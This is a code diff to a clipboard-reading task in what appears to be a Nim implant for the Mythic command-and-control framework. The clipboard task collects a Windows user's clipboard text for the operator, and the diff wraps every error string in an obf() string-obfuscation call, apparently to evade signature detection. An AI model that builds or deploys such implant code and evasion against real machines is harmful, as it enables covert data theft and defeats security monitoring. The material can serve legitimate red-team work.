@@ -1,5 +1,6 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/json
 
 when defined(windows):
@@ -11,24 +12,24 @@ proc clipboard*(taskId: string, params: JsonNode): JsonNode =
     try:
       # Open the clipboard
       if OpenClipboard(0) == 0:
-        return mythicError(taskId, "Failed to open clipboard")
+        return mythicError(taskId, obf("Failed to open clipboard"))
       
       # Check if clipboard contains text
       if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0:
         CloseClipboard()
-        return mythicError(taskId, "Clipboard does not contain text data")
+        return mythicError(taskId, obf("Clipboard does not contain text data"))
       
       # Get clipboard data handle
       let hClipboardData = GetClipboardData(CF_UNICODETEXT)
       if hClipboardData == 0:
         CloseClipboard()
-        return mythicError(taskId, "Failed to get clipboard data")
+        return mythicError(taskId, obf("Failed to get clipboard data"))
       
       # Lock the clipboard data to get a pointer
       let pchData = GlobalLock(hClipboardData)
       if pchData == nil:
         CloseClipboard()
-        return mythicError(taskId, "Failed to lock clipboard data")
+        return mythicError(taskId, obf("Failed to lock clipboard data"))
       
       # Convert wide string to regular string
       let clipboardText = $cast[LPWSTR](pchData)
@@ -43,6 +44,6 @@ proc clipboard*(taskId: string, params: JsonNode): JsonNode =
       
     except Exception as e:
       CloseClipboard()
-      return mythicError(taskId, "Error reading clipboard: " & e.msg)
+      return mythicError(taskId, obf("Error reading clipboard: ") & e.msg)
   else:
-    return mythicError(taskId, "clipboard command is only available on Windows")
+    return mythicError(taskId, obf("clipboard command is only available on Windows"))
